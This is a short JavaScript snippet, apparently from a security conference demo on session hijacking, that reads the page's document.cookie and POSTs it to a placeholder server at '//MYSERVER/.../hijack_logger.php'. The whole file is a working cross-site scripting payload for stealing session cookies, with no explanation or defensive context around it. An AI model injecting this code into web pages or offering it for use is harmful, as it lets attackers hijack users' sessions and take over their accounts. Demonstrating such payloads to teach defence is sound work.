var request = new XMLHttpRequest();
request.open('POST', '//MYSERVER/ncdevcon_security_hijack/hijack_logger.php', true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send('c=' + encodeURIComponent(document.cookie));

